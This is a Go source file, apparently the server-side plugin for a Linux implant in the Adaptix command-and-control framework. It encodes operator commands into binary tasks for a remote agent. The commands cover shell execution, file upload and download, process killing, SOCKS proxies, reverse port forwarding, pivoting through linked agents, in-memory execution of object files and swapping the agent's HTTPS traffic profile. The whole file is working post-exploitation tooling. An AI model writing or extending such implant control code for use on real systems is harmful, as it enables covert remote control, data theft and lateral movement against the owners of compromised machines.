package main

import (
	"encoding/base64"
	"encoding/binary"
	"errors"
	"fmt"
	"math/rand"
	"strconv"
//	"strings"
	"sync"

	adaptix "github.com/Adaptix-Framework/axc2/v2"
)

var pendingCmdIds  sync.Map
var pendingProfiles sync.Map
var pendingPaths    sync.Map // key: taskIdStr, value: ls path

// Command IDs — must match nax_linux.h NAX_CMD_* in the C agent.
const (
	CMD_PIVOT_EXEC   byte = 0x37
	CMD_LINK         byte = 0x38
	CMD_UNLINK       byte = 0x39
	CMD_WHOAMI       byte = 0x10
	CMD_EXIT_THREAD  byte = 0x12
	CMD_EXIT_PROCESS byte = 0x13
	CMD_CD           byte = 0x14
	CMD_PWD          byte = 0x15
	CMD_MKDIR        byte = 0x16
	CMD_RMDIR        byte = 0x17
	CMD_CAT          byte = 0x18
	CMD_LS           byte = 0x19
	CMD_DOWNLOAD     byte = 0x22
	CMD_PS_LIST      byte = 0x23
	CMD_IFCONFIG     byte = 0x2B
	CMD_PS_KILL      byte = 0x24
	CMD_PS_RUN       byte = 0x25
	CMD_UPLOAD       byte = 0x26
	CMD_RM           byte = 0x27
	CMD_SHELL        byte = 0x28
	CMD_ENV          byte = 0x29
	CMD_ZIP          byte = 0x2A
	CMD_SLEEP        byte = 0x2C
	CMD_BOF          byte = 0x50
	CMD_BOF_ASYNC    byte = 0x51
	CMD_BOF_JOBS     byte = 0x52
	CMD_BOF_KILL     byte = 0x53
	CMD_PROFILE_UPDATE byte = 0x3A
)

const (
	STATUS_OK  byte = 0x00
	STATUS_ERR byte = 0x01
)

func simpleCmd(cmdId byte) adaptix.TaskData {
	return adaptix.TaskData{
		Type: adaptix.TASK_TYPE_TASK,
		Sync: true,
		Data: []byte{cmdId, 0x00, 0x00, 0x00, 0x00},
	}
}

func packString(s string) []byte {
	b := []byte(s)
	out := make([]byte, 4+len(b))
	binary.LittleEndian.PutUint32(out, uint32(len(b)))
	copy(out[4:], b)
	return out
}

func pathCmd(cmdId byte, path string) adaptix.TaskData {
	args := packString(path)
	data := make([]byte, 1+4+len(args))
	data[0] = cmdId
	binary.LittleEndian.PutUint32(data[1:], uint32(len(args)))
	copy(data[5:], args)
	return adaptix.TaskData{Type: adaptix.TASK_TYPE_TASK, Sync: true, Data: data}
}

func CreateCommand(agentData adaptix.AgentData, args map[string]any) (adaptix.TaskData, adaptix.ConsoleMessageData, error) {
	command,    _ := args["command"].(string)
	subcommand, _ := args["subcommand"].(string)

	switch command {


	case "whoami":
		return simpleCmd(CMD_WHOAMI), adaptix.ConsoleMessageData{}, nil

	case "pwd":
		return simpleCmd(CMD_PWD), adaptix.ConsoleMessageData{}, nil

	case "env":
		return simpleCmd(CMD_ENV), adaptix.ConsoleMessageData{}, nil

	case "sleep":
		// sleep <seconds> [jitter%] — operator passes seconds, agent receives ms
		// args: [sleep_ms(4 LE)][jitter_pct(1)] = 5 bytes (wire format unchanged)
		sleepSec  := uint32(5)
		jitterPct := uint8(0)
		if v, ok2 := args["seconds"].(float64); ok2 { sleepSec = uint32(v) }
		sleepMs   := sleepSec * 1000  // convert to ms for the C agent
		if v, ok2 := args["jitter"].(float64); ok2 {
			j := uint8(v)
			if j > 100 { j = 100 }
			jitterPct = j
		}
		args_bytes := make([]byte, 5)
		binary.LittleEndian.PutUint32(args_bytes[0:4], sleepMs)  // ms
		args_bytes[4] = jitterPct
		data := make([]byte, 1+4+5)
		data[0] = CMD_SLEEP
		binary.LittleEndian.PutUint32(data[1:5], 5)
		copy(data[5:], args_bytes)
		return adaptix.TaskData{Type: adaptix.TASK_TYPE_TASK, Sync: true, Data: data},
			adaptix.ConsoleMessageData{}, nil

	case "cd":
		path, _ := args["path"].(string)
		if path == "" {
			path = "~"
		}
		return pathCmd(CMD_CD, path), adaptix.ConsoleMessageData{}, nil

	case "mkdir":
		path, _ := args["path"].(string)
		if path == "" {
			return adaptix.TaskData{}, adaptix.ConsoleMessageData{}, fmt.Errorf("mkdir: path required")
		}
		return pathCmd(CMD_MKDIR, path), adaptix.ConsoleMessageData{}, nil

	case "rmdir":
		path, _ := args["path"].(string)
		if path == "" {
			return adaptix.TaskData{}, adaptix.ConsoleMessageData{}, fmt.Errorf("rmdir: path required")
		}
		return pathCmd(CMD_RMDIR, path), adaptix.ConsoleMessageData{}, nil

	case "ls":
		path, _ := args["path"].(string)
		return pathCmd(CMD_LS, path), adaptix.ConsoleMessageData{}, nil

	case "cat":
		path, _ := args["path"].(string)
		if path == "" {
			return adaptix.TaskData{}, adaptix.ConsoleMessageData{}, fmt.Errorf("cat: path required")
		}
		return pathCmd(CMD_CAT, path), adaptix.ConsoleMessageData{}, nil

	case "rm":
		path, _ := args["path"].(string)
		if path == "" {
			return adaptix.TaskData{}, adaptix.ConsoleMessageData{}, fmt.Errorf("rm: path required")
		}
		return pathCmd(CMD_RM, path), adaptix.ConsoleMessageData{}, nil

	case "download":
		path, _ := args["path"].(string)
		if path == "" {
			return adaptix.TaskData{}, adaptix.ConsoleMessageData{}, fmt.Errorf("download: path required")
		}
		task := pathCmd(CMD_DOWNLOAD, path)
		return task, adaptix.ConsoleMessageData{}, nil

	case "upload":
		remotePath, _ := args["path"].(string)
		if remotePath == "" {
			return adaptix.TaskData{}, adaptix.ConsoleMessageData{}, fmt.Errorf("upload: remote path required")
		}
		fileB64, _ := args["file"].(string)
		if fileB64 == "" {
			return adaptix.TaskData{}, adaptix.ConsoleMessageData{}, fmt.Errorf("upload: file required")
		}
		fileContent, err := base64.StdEncoding.DecodeString(fileB64)
		if err != nil {
			return adaptix.TaskData{}, adaptix.ConsoleMessageData{}, fmt.Errorf("upload: base64 decode: %w", err)
		}
		pathBytes   := packString(remotePath)
		contentPack := make([]byte, 4+len(fileContent))
		binary.LittleEndian.PutUint32(contentPack, uint32(len(fileContent)))
		copy(contentPack[4:], fileContent)

		args_buf := append(pathBytes, contentPack...)
		data := make([]byte, 1+4+len(args_buf))
		data[0] = CMD_UPLOAD
		binary.LittleEndian.PutUint32(data[1:], uint32(len(args_buf)))
		copy(data[5:], args_buf)
		return adaptix.TaskData{Type: adaptix.TASK_TYPE_TASK, Sync: true, Data: data}, adaptix.ConsoleMessageData{}, nil

	// ===== shell =====
	case "shell":
		cmd, _ := args["cmd"].(string)
		if cmd == "" {
			return adaptix.TaskData{}, adaptix.ConsoleMessageData{}, fmt.Errorf("shell: command required")
		}
		return pathCmd(CMD_SHELL, cmd), adaptix.ConsoleMessageData{}, nil

	case "ps":
		return simpleCmd(CMD_PS_LIST), adaptix.ConsoleMessageData{}, nil

	case "ifconfig":
		return simpleCmd(CMD_IFCONFIG), adaptix.ConsoleMessageData{}, nil

	case "kill":
		pid, _ := args["pid"].(string)
		if pid == "" {
			return adaptix.TaskData{}, adaptix.ConsoleMessageData{}, fmt.Errorf("kill: PID required")
		}
		return pathCmd(CMD_PS_KILL, pid), adaptix.ConsoleMessageData{}, nil

	case "exit":
		return simpleCmd(CMD_EXIT_PROCESS), adaptix.ConsoleMessageData{}, nil

	case "socks":
		switch subcommand {
		case "start":
			address, _ := args["address"].(string)
			if address == "" {
				address = "0.0.0.0"
			}
			portVal, _ := args["port"].(float64)
			port := int(portVal)
			if port < 1 || port > 65535 {
				return adaptix.TaskData{}, adaptix.ConsoleMessageData{},
					errors.New("nax-linux: socks start: port must be 1-65535")
			}
			socks4, _ := args["-socks4"].(bool)
			taskData := adaptix.TaskData{Type: adaptix.TASK_TYPE_TUNNEL}
			var tunnelId int64
			var err error
			if socks4 {
				tunnelId, err = Ts.TsTunnelCreateSocks4(agentData.Id, "", address, port)
				if err != nil {
					return adaptix.TaskData{}, adaptix.ConsoleMessageData{}, err
				}
				taskData.TaskId, err = Ts.TsTunnelStart(tunnelId)
				if err != nil {
					return adaptix.TaskData{}, adaptix.ConsoleMessageData{}, err
				}
				msg := adaptix.ConsoleMessageData{Status: adaptix.MESSAGE_SUCCESS, Message: fmt.Sprintf("SOCKS4 proxy started on %s:%d", address, port)}
				return taskData, msg, nil
			}
			auth, _ := args["-auth"].(bool)
			username, _ := args["username"].(string)
			password, _ := args["password"].(string)
			tunnelId, err = Ts.TsTunnelCreateSocks5(agentData.Id, "", address, port, auth, username, password)
			if err != nil {
				return adaptix.TaskData{}, adaptix.ConsoleMessageData{}, err
			}
			taskData.TaskId, err = Ts.TsTunnelStart(tunnelId)
			if err != nil {
				return adaptix.TaskData{}, adaptix.ConsoleMessageData{}, err
			}
			msgText := fmt.Sprintf("SOCKS5 proxy started on %s:%d", address, port)
			if auth {
				msgText = fmt.Sprintf("SOCKS5 proxy (auth) started on %s:%d", address, port)
			}
			msg := adaptix.ConsoleMessageData{Status: adaptix.MESSAGE_SUCCESS, Message: msgText}
			return taskData, msg, nil

		case "stop":
			portVal, _ := args["port"].(float64)
			port := int(portVal)
			if port < 1 || port > 65535 {
				return adaptix.TaskData{}, adaptix.ConsoleMessageData{},
					errors.New("nax-linux: socks stop: port must be 1-65535")
			}
			Ts.TsTunnelStopSocks(agentData.Id, port)
			taskData := adaptix.TaskData{Type: adaptix.TASK_TYPE_TUNNEL}
			msg := adaptix.ConsoleMessageData{Status: adaptix.MESSAGE_SUCCESS, Message: fmt.Sprintf("SOCKS proxy on port %d stopped", port)}
			return taskData, msg, nil

		default:
			return adaptix.TaskData{}, adaptix.ConsoleMessageData{},
				errors.New("nax-linux: socks: subcommand must be 'start' or 'stop'")
		}

	case "rportfwd":
		lportVal, _ := args["lport"].(float64)
		lport := int(lportVal)
		if lport < 1 || lport > 65535 {
			return adaptix.TaskData{}, adaptix.ConsoleMessageData{},
				errors.New("nax-linux: rportfwd: lport must be 1-65535")
		}
		switch subcommand {
		case "start":
			fwdhost, _ := args["fwdhost"].(string)
			fwdportVal, _ := args["fwdport"].(float64)
			fwdport := int(fwdportVal)
			bindAll, _ := args["-b"].(bool)
			if fwdhost == "" {
				return adaptix.TaskData{}, adaptix.ConsoleMessageData{},
					errors.New("nax-linux: rportfwd start: fwdhost required")
			}
			if fwdport < 1 || fwdport > 65535 {
				return adaptix.TaskData{}, adaptix.ConsoleMessageData{},
					errors.New("nax-linux: rportfwd start: fwdport must be 1-65535")
			}
			tunnelId, err := Ts.TsTunnelCreateRportfwd(agentData.Id, "", lport, fwdhost, fwdport)
			if err != nil {
				return adaptix.TaskData{}, adaptix.ConsoleMessageData{}, err
			}
			if bindAll {
				tunnelBindAllMap.Store(tunnelId, true)
			}
			rportfwdTunnelIds.Store(rportfwdKey(agentData.Id, lport), tunnelId)
			taskData := adaptix.TaskData{Type: adaptix.TASK_TYPE_TUNNEL}
			taskData.TaskId, err = Ts.TsTunnelStart(tunnelId)
			if err != nil {
				return adaptix.TaskData{}, adaptix.ConsoleMessageData{}, err
			}
			bindDisplay := "127.0.0.1"
			if bindAll { bindDisplay = "0.0.0.0" }
			msg := adaptix.ConsoleMessageData{Status: adaptix.MESSAGE_SUCCESS,
				Message: fmt.Sprintf("rportfwd %s:%d -> %s:%d started", bindDisplay, lport, fwdhost, fwdport)}
			return taskData, msg, nil

		case "stop":
			taskData := adaptix.TaskData{Type: adaptix.TASK_TYPE_TUNNEL}
			if v, ok := rportfwdTunnelIds.LoadAndDelete(rportfwdKey(agentData.Id, lport)); ok {
				tid := v.(int64)
				taskData = rportfwdCloseTask(tid)
			}
			Ts.TsTunnelStopRportfwd(agentData.Id, lport)
			msg := adaptix.ConsoleMessageData{Status: adaptix.MESSAGE_SUCCESS, Message: fmt.Sprintf("rportfwd on port %d stopped", lport)}
			return taskData, msg, nil

		default:
			return adaptix.TaskData{}, adaptix.ConsoleMessageData{},
				errors.New("nax-linux: rportfwd: subcommand must be 'start' or 'stop'")
		}

	case "zip":
		src, _ := args["src"].(string)
		dst, _ := args["dst"].(string)
		if src == "" {
			return adaptix.TaskData{}, adaptix.ConsoleMessageData{},
				fmt.Errorf("nax-linux: zip: 'src' required")
		}
		if dst == "" {
			dst = src + ".zip"
		}
		srcBytes := []byte(src)
		dstBytes := []byte(dst)
		argsLen := 4 + len(srcBytes) + 4 + len(dstBytes)
		data := make([]byte, 1+4+argsLen)
		data[0] = CMD_ZIP
		binary.LittleEndian.PutUint32(data[1:5], uint32(argsLen))
		binary.LittleEndian.PutUint32(data[5:9], uint32(len(srcBytes)))
		copy(data[9:], srcBytes)
		off := 9 + len(srcBytes)
		binary.LittleEndian.PutUint32(data[off:off+4], uint32(len(dstBytes)))
		copy(data[off+4:], dstBytes)
		task := adaptix.TaskData{Type: adaptix.TASK_TYPE_TASK, Data: data, Sync: true}
		msg := adaptix.ConsoleMessageData{Status: adaptix.MESSAGE_INFO,
			Message: fmt.Sprintf("zip '%s' → '%s' queued", src, dst)}
		return task, msg, nil

	case "link":
		switch subcommand {
		case "tcp-bind":
			target, _ := args["target"].(string)
			portVal, _ := args["port"].(float64)
			port := uint16(portVal)
			if target == "" || port == 0 {
				return adaptix.TaskData{}, adaptix.ConsoleMessageData{},
					fmt.Errorf("nax-linux: link tcp-bind: 'target' and 'port' required")
			}
			targetBytes := []byte(target)
			argsLen := 1 + 2 + 4 + len(targetBytes)
			data := make([]byte, 5+argsLen)
			data[0] = CMD_LINK
			binary.LittleEndian.PutUint32(data[1:5], uint32(argsLen))
			data[5] = 2
			binary.LittleEndian.PutUint16(data[6:8], port)
			binary.LittleEndian.PutUint32(data[8:12], uint32(len(targetBytes)))
			copy(data[12:], targetBytes)
			task := adaptix.TaskData{Type: adaptix.TASK_TYPE_TASK, Data: data, Sync: true}
			msg := adaptix.ConsoleMessageData{Status: adaptix.MESSAGE_INFO, Message: fmt.Sprintf("link tcp-bind %s:%d queued", target, port)}
			return task, msg, nil
		default:
			return adaptix.TaskData{}, adaptix.ConsoleMessageData{},
				fmt.Errorf("nax-linux: link: unknown subcommand %q (use 'tcp-bind')", subcommand)
		}

	case "unlink":
		pivotIdStr, _ := args["pivot_id"].(string)
		if pivotIdStr == "" {
			return adaptix.TaskData{}, adaptix.ConsoleMessageData{},
				fmt.Errorf("nax-linux: unlink: 'pivot_id' required")
		}
		pivotIdVal, err := strconv.ParseUint(pivotIdStr, 16, 32)
		if err != nil {
			return adaptix.TaskData{}, adaptix.ConsoleMessageData{},
				fmt.Errorf("nax-linux: unlink: invalid pivot_id %q: %w", pivotIdStr, err)
		}
		data := make([]byte, 9)
		data[0] = CMD_UNLINK
		binary.LittleEndian.PutUint32(data[1:5], 4)
		binary.LittleEndian.PutUint32(data[5:9], uint32(pivotIdVal))
		task := adaptix.TaskData{Type: adaptix.TASK_TYPE_TASK, Data: data, Sync: true}
		msg := adaptix.ConsoleMessageData{Status: adaptix.MESSAGE_INFO, Message: fmt.Sprintf("unlink %s queued", pivotIdStr)}
		return task, msg, nil

	case "bof":
		bofB64, _ := args["file"].(string)
		if bofB64 == "" {
			return adaptix.TaskData{}, adaptix.ConsoleMessageData{},
				fmt.Errorf("bof: .o file required")
		}
		bofBytes, decErr := base64.StdEncoding.DecodeString(bofB64)
		if decErr != nil {
			return adaptix.TaskData{}, adaptix.ConsoleMessageData{},
				fmt.Errorf("bof: base64 decode: %w", decErr)
		}
		if len(bofBytes) < 20 {
			return adaptix.TaskData{}, adaptix.ConsoleMessageData{},
				fmt.Errorf("bof: file too small to be a valid ELF .o")
		}
		var packedArgs []byte
		if argSpec, ok := args["args"].(string); ok && argSpec != "" {
			decoded, b64Err := base64.StdEncoding.DecodeString(argSpec)
			if b64Err == nil && len(decoded) >= 4 {
				packedArgs = decoded
			} else {
				packed, packErr := packBofArgs(argSpec)
				if packErr != nil {
					return adaptix.TaskData{}, adaptix.ConsoleMessageData{},
						fmt.Errorf("bof: args pack: %w", packErr)
				}
				packedArgs = packed
			}
		}
		// Wire: cmd(1) | total_len(4LE) | bof_size(4LE) | bof | args_size(4LE) | args
		bofSize := len(bofBytes)
		argsSize := len(packedArgs)
		innerLen := 4 + bofSize + 4 + argsSize
		bofData := make([]byte, 5+innerLen)
		bofData[0] = CMD_BOF
		binary.LittleEndian.PutUint32(bofData[1:5], uint32(innerLen))
		binary.LittleEndian.PutUint32(bofData[5:9], uint32(bofSize))
		copy(bofData[9:9+bofSize], bofBytes)
		binary.LittleEndian.PutUint32(bofData[9+bofSize:13+bofSize], uint32(argsSize))
		if argsSize > 0 {
			copy(bofData[13+bofSize:], packedArgs)
		}
		return adaptix.TaskData{Type: adaptix.TASK_TYPE_TASK, Sync: true, Data: bofData},
			adaptix.ConsoleMessageData{Status: adaptix.MESSAGE_INFO,
				Message: fmt.Sprintf("BOF queued (%d bytes)", bofSize)}, nil

	case "bof_async":
		bofB64, _ := args["file"].(string)
		if bofB64 == "" {
			return adaptix.TaskData{}, adaptix.ConsoleMessageData{},
				fmt.Errorf("bof_async: .o file required")
		}
		bofBytes, decErr := base64.StdEncoding.DecodeString(bofB64)
		if decErr != nil {
			return adaptix.TaskData{}, adaptix.ConsoleMessageData{},
				fmt.Errorf("bof_async: base64 decode: %w", decErr)
		}
		var packedArgs []byte
		if argSpec, ok := args["args"].(string); ok && argSpec != "" {
			decoded, b64Err := base64.StdEncoding.DecodeString(argSpec)
			if b64Err == nil && len(decoded) >= 4 {
				packedArgs = decoded
			} else {
				packed, packErr := packBofArgs(argSpec)
				if packErr != nil {
					return adaptix.TaskData{}, adaptix.ConsoleMessageData{},
						fmt.Errorf("bof_async: args pack: %w", packErr)
				}
				packedArgs = packed
			}
		}
		bofSize := len(bofBytes)
		argsSize := len(packedArgs)
		innerLen := 4 + bofSize + 4 + argsSize
		bofData := make([]byte, 5+innerLen)
		bofData[0] = CMD_BOF_ASYNC
		binary.LittleEndian.PutUint32(bofData[1:5], uint32(innerLen))
		binary.LittleEndian.PutUint32(bofData[5:9], uint32(bofSize))
		copy(bofData[9:9+bofSize], bofBytes)
		binary.LittleEndian.PutUint32(bofData[9+bofSize:13+bofSize], uint32(argsSize))
		if argsSize > 0 {
			copy(bofData[13+bofSize:], packedArgs)
		}
		return adaptix.TaskData{Type: adaptix.TASK_TYPE_TASK, Sync: true, Data: bofData},
			adaptix.ConsoleMessageData{Status: adaptix.MESSAGE_INFO,
				Message: fmt.Sprintf("Async BOF running (%d bytes) — result on completion", bofSize)}, nil

	case "jobs":
		data := []byte{CMD_BOF_JOBS, 0, 0, 0, 0}
		return adaptix.TaskData{Type: adaptix.TASK_TYPE_TASK, Sync: true, Data: data},
			adaptix.ConsoleMessageData{Status: adaptix.MESSAGE_INFO, Message: "Listing jobs..."}, nil

	case "jobkill":
		idxStr, _ := args["job_id"].(string)
		if idxStr == "" {
			return adaptix.TaskData{}, adaptix.ConsoleMessageData{},
				fmt.Errorf("jobkill: job_id required")
		}
		idx := 0
		fmt.Sscan(idxStr, &idx)
		data := make([]byte, 9)
		data[0] = CMD_BOF_KILL
		binary.LittleEndian.PutUint32(data[1:5], 4)
		binary.LittleEndian.PutUint32(data[5:9], uint32(idx))
		return adaptix.TaskData{Type: adaptix.TASK_TYPE_TASK, Sync: true, Data: data},
			adaptix.ConsoleMessageData{Status: adaptix.MESSAGE_INFO,
				Message: fmt.Sprintf("Killing job #%d", idx)}, nil

	case "profile_update":
		profileB64, _ := args["profile"].(string)
		if profileB64 == "" {
			return adaptix.TaskData{}, adaptix.ConsoleMessageData{},
				fmt.Errorf("profile_update: profile JSON file required")
		}
		profileJSON, decErr := base64.StdEncoding.DecodeString(profileB64)
		if decErr != nil {
			return adaptix.TaskData{}, adaptix.ConsoleMessageData{},
				fmt.Errorf("profile_update: base64 decode: %w", decErr)
		}
		// Parse the JSON into a ProfileConfig and encode as v2 wire
		profileCfg, parseErr := ParseProfileJSON(profileJSON)
		if parseErr != nil {
			return adaptix.TaskData{}, adaptix.ConsoleMessageData{},
				fmt.Errorf("profile_update: parse: %w", parseErr)
		}
		wireData := EncodeProfileBodyV2(profileCfg)
		cmdData := make([]byte, 5+len(wireData))
		cmdData[0] = CMD_PROFILE_UPDATE
		binary.LittleEndian.PutUint32(cmdData[1:5], uint32(len(wireData)))
		copy(cmdData[5:], wireData)
		// Store profile config — ProcessData will save to store when agent confirms
		pendingProfiles.Store(string(agentData.UID), profileCfg)

		return adaptix.TaskData{Type: adaptix.TASK_TYPE_TASK, Sync: true, Data: cmdData},
			adaptix.ConsoleMessageData{Status: adaptix.MESSAGE_INFO,
				Message: "Updating HTTPS profile..."}, nil

	default:
		return adaptix.TaskData{}, adaptix.ConsoleMessageData{}, fmt.Errorf("linux agent: unknown command: %s", command)
	}
}

func PackTasks(agentData adaptix.AgentData, tasks []adaptix.TaskData) ([]byte, error) {
	_ = agentData
	var out []byte
	for _, t := range tasks {
		if len(t.Data) == 0 {
			continue
		}
		cmdId   := t.Data[0]
		argsLen := uint32(0)
		var argsBytes []byte
		if len(t.Data) >= 5 {
			argsLen  = binary.LittleEndian.Uint32(t.Data[1:5])
			if argsLen > 0 && len(t.Data) >= 5+int(argsLen) {
				argsBytes = t.Data[5 : 5+argsLen]
			}
		}

		// Track cmdId by taskId so ProcessData can dispatch per-command logic
		taskIdStr := fmt.Sprintf("%08x", uint32(t.TaskId))
		pendingCmdIds.Store(taskIdStr, cmdId)

		// For CMD_LS, store the path so the GUI file browser knows the directory
		//if cmdId == CMD_LS && len(argsBytes) > 0 {
		//	pendingPaths.Store(taskIdStr, strings.TrimRight(string(argsBytes), "\x00"))
		//}

		body := make([]byte, 9+len(argsBytes))
		binary.LittleEndian.PutUint32(body[0:], uint32(t.TaskId))
		body[4] = cmdId
		binary.LittleEndian.PutUint32(body[5:], uint32(len(argsBytes)))
		copy(body[9:], argsBytes)

		frame := EncodeFrame(WireTypeTask, body)
		out = append(out, frame...)
	}
	if len(out) == 0 {
		out = EncodeFrame(WireTypeNoTasks, nil)
	}
	return out, nil
}

// PivotPackData is called by the Adaptix server to relay packed tasks
// to a child agent through this agent (acting as parent/relay)
func PivotPackData(pivotId string, data []byte) (adaptix.TaskData, error) {
	if len(data) == 0 {
		return adaptix.TaskData{}, fmt.Errorf("nax-linux: PivotPackData: empty data")
	}
	pivotIdInt, err := strconv.ParseUint(pivotId, 16, 32)
	if err != nil {
		return adaptix.TaskData{}, fmt.Errorf("nax-linux: PivotPackData: bad pivotId %q: %w", pivotId, err)
	}
	argsLen := 4 + 4 + len(data)
	buf := make([]byte, 5+argsLen)
	buf[0] = CMD_PIVOT_EXEC
	binary.LittleEndian.PutUint32(buf[1:5], uint32(argsLen))
	binary.LittleEndian.PutUint32(buf[5:9], uint32(pivotIdInt))
	binary.LittleEndian.PutUint32(buf[9:13], uint32(len(data)))
	copy(buf[13:], data)
	return adaptix.TaskData{
		TaskId: int64(rand.Uint32()),
		Type:   adaptix.TASK_TYPE_PROXY_DATA,
		Data:   buf,
		Sync:   false,
	}, nil
}
